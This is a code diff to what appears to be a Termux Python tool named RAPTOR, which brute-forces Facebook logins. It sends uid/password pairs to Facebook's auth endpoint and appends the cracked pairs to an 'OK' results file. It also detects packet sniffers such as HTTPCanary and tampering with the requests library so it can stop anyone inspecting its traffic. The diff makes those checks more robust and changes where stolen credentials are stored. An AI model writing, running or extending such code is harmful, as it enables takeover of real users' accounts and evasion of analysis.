@@ -125,8 +125,12 @@ class sec:
             '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
         ]
         for path in paths:
-            if 'print' in open(path, 'r').read():
-                self.fuck()
+            try:
+                if os.path.exists(path):
+                    if 'print' in open(path, 'r').read():
+                        self.fuck()
+            except Exception:
+                pass
         # Check for HTTPCanary (a packet sniffing app)
         if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
             self.fuck()
@@ -273,6 +277,15 @@ def creationyear(uid):
 
 def clear():
     os.system('clear')
+
+def write_result(file_name: str, content: str) -> None:
+    try:
+        out_dir = os.path.join(os.getcwd(), 'results')
+        os.makedirs(out_dir, exist_ok=True)
+        with open(os.path.join(out_dir, file_name), 'a', encoding='utf-8') as f:
+            f.write(content)
+    except Exception:
+        pass
 
 
 def linex():
@@ -483,12 +496,12 @@ def login_1(uid):
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
                 print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mRAPTOR\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/RAPTOR-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                write_result('RAPTOR-OLD-M1-OK.txt', f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                 print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAPTOR\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/RAPTOR-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                write_result('RAPTOR-OLD-M1-OK.txt', f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
         loop += 1
